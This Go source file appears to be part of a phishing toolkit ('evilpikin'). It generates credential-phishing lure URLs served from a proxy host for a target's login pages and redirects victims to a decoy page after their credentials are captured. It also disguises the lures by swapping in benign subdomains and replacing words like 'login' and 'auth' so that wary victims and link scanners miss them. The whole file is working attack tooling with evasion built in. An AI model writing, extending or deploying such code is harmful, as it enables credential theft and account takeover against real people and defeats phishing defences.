package console

import (
	"net/url"
	"strings"

	"github.com/user/evilpikin/internal/storage"
)

// sensitivePathTokens maps obvious phishing path segments to benign masks so
// a lure URL does not visually advertise "login" / "auth" to a wary victim or
// link scanner.
var sensitivePathTokens = map[string]string{
	"login":     "portal",
	"signin":    "account",
	"signon":    "secure",
	"auth":      "sso",
	"oauth":     "verify",
	"authorize": "confirm",
}

// BuildLures constructs the actual phishing deep-links for a target. Every
// login endpoint on the origin becomes a URL served from the proxy host,
// carrying the post-capture redirect so the victim lands on the intended
// decoy after credential theft.
func BuildLures(t *storage.TargetProfile) []string {
	redirect := t.RedirectURL
	if redirect == "" && len(t.Lure) > 0 {
		for _, v := range t.Lure { // first decoy destination wins
			redirect = v
			break
		}
	}

	var lures []string
	add := func(raw string) {
		u, err := url.Parse(raw)
		if err != nil {
			return
		}
		if u.Scheme == "" {
			u.Scheme = "https"
		}
		// The phishing entry point is always served from the proxy host,
		// never the origin, so force the host regardless of the source URL.
		u.Host = t.ProxyHost
		if u.Path == "" {
			u.Path = "/login"
		}
		q := u.Query()
		if redirect != "" {
			q.Set("r", redirect)
		}
		u.RawQuery = q.Encode()
		lures = append(lures, u.String())
	}

	if len(t.LoginURLs) > 0 {
		for _, lu := range t.LoginURLs {
			add(lu)
		}
	} else {
		add("https://" + t.ProxyHost + "/login")
	}
	return lures
}

// MaskLure rewrites a raw phishing URL into a masked variant:
//  1. subdomain masking via PhishSub (benign subdomain in front of the real
//     registered domain), and
//  2. path-token masking via sensitivePathTokens.
func MaskLure(t *storage.TargetProfile, raw string) string {
	u, err := url.Parse(raw)
	if err != nil || u.Host == "" {
		return raw
	}
	if len(t.PhishSub) > 0 {
		parts := strings.SplitN(u.Host, ".", 2)
		if len(parts) == 2 {
			u.Host = t.PhishSub[0] + "." + parts[1]
		}
	}
	u.Path = maskPath(u.Path)
	return u.String()
}

func maskPath(p string) string {
	segs := strings.Split(p, "/")
	for i, s := range segs {
		if masked, ok := sensitivePathTokens[strings.ToLower(s)]; ok {
			segs[i] = masked
		}
	}
	return strings.Join(segs, "/")
}

// DecoyLures returns the post-capture redirect destinations configured for a
// target (the "lure" map), used by operators to choose where victims end up.
func DecoyLures(t *storage.TargetProfile) map[string]string {
	return t.Lure
}
